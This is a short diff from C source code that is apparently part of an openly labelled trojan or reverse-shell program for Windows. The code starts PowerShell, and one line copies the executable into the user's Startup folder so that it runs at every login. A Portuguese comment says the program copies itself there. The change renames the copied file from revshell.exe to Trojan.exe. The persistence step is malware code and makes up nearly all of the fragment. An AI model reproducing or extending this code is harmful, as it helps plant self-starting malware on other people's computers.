@@ -24,7 +24,7 @@ int main(void){
     char * const argv[] = {"powershel.exe", NULL};
     execve("powershell.exe", argv, NULL);
 
-    system("copy revshell.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");// executando o comando para se auto copiar 
+    system("copy Trojan.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");// executando o comando para se auto copiar 
 
     return 0;       
 }
